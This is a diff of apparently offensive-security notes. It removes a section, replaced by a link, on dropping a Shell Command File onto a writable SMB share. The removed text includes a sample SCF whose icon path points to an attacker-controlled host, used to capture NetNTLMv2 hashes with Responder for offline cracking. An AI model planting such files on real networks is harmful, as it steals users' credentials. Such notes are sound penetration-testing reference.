@@ -31,19 +31,4 @@ sudo umount $LOCAL_MOUNT_PATH
 
 ## Write a SCF File to a Public SMB Share to Potentially Capture Someone's Hash
 
-If you have write access to some directory within an SMB share, you can write a Shell Command File (SCF) file to that share whose icon is linked to an attacker-controlled SMB share. If a user clicks on the file, their computer will forward their NetNTLMv2 hash to the attacker-controlled SMB share. This hash can be cracked offline.
-
-On the attacker-controlled machine, [[responder#Start Responding|start responding with responder]].
-
-Create the SCF, something that looks like this:
-
-```bash
-$ cat tgihf.scf
-[Shell]
-Command=2
-IconFile=\\$ATTACKER_FQDN_OR_IP\$ANY_SHARE_NAME\icon.ico
-[Taskbar]
-Command=ToggleDesktop
-```
-
-Write the SCF file to the writable SMB share folder and wait. If a user clicks on the file, their NetNTLMv2 hash will be captured by `responder`.
+[[scf-files]]
